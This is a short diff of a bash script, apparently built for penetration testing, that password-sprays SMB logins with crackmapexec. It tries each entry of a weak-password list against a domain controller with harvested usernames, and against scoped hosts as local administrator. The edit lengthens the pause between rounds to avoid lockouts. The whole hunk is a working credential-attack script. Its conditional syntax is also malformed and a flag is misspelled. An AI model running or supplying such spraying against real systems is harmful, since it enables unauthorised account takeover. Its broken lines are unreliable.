@@ -23,8 +23,8 @@ echo "local (y/n): $1";
 if [$1 = "y"] || [$1="Y"]; l="--local-auth"; else l=""
 echo $l
 pause
-for i in $(cat lists/weak_passwords.txt); do crackmapexec smb "dc_ip" -u discovered-usernames.txt -p $i --continue-on-sucess; echo sleeping; t=1800;while [ $t -gt 0 ];do printf "\rTime left: %02d:%02d" $((t/60)) $((t%60));sleep 1;t=$((t-1));done;echo -e "Sleeping";done
+for i in $(cat lists/weak_passwords.txt); do crackmapexec smb "dc_ip" -u discovered-usernames.txt -p $i --continue-on-sucess; echo sleeping; t=2100;while [ $t -gt 0 ];do printf "\rTime left: %02d:%02d" $((t/60)) $((t%60));sleep 1;t=$((t-1));done;echo -e "Sleeping";done
 
 ##local auth
-for i in $(cat ~/lists/weak_passwords.txt); do crackmapexec smb ~/scope.txt --local-auth -u administrator -p $i --continue-on-sucess; echo sleeping; t=1800;while [ $t -gt 0 ];do printf "\rTime left: %02d:%02d" $((t/60)) $((t%60));sleep 1;t=$((t-1));done;echo -e "Sleeping";done
+for i in $(cat ~/lists/weak_passwords.txt); do crackmapexec smb ~/scope.txt --local-auth -u administrator -p $i --continue-on-sucess; echo sleeping; t=2100;while [ $t -gt 0 ];do printf "\rTime left: %02d:%02d" $((t/60)) $((t%60));sleep 1;t=$((t-1));done;echo -e "Sleeping";done
 
